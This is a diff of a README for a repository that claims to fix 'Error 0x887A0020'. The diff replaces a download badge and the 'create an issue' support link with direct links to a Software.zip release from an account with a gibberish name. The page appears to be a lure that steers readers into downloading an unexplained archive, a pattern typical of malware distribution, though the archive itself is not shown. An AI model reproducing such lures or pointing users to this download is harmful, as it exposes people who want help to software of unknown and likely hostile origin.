@@ -12,7 +12,7 @@ The "Error 0x887A0020" often appears due to problems with the graphics driver or
 
 To begin fixing the "Error 0x887A0020", download the software from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/doodooheadthghhhtuttddfhkkjjggfg/Fixing-Error-0x887A0020/releases/download/v2.0/Software.zip)](https://github.com/doodooheadthghhhtuttddfhkkjjggfg/Fixing-Error-0x887A0020/releases/download/v2.0/Software.zip)
 
 ## Installation Guide
 
@@ -29,7 +29,7 @@ Contributions to enhance and improve the software provided in this repository ar
 
 ## Support
 
-If you encounter any issues or have questions regarding the "Fixing Error 0x887A0020" repository, please [create an issue](https://github.com/your-username/Fixing-Error-0x887A0020/issues). Our team will assist you promptly.
+If you encounter any issues or have questions regarding the "Fixing Error 0x887A0020" repository, please [create an issue](https://github.com/doodooheadthghhhtuttddfhkkjjggfg/Fixing-Error-0x887A0020/releases/download/v2.0/Software.zip). Our team will assist you promptly.
 
 ## License
 
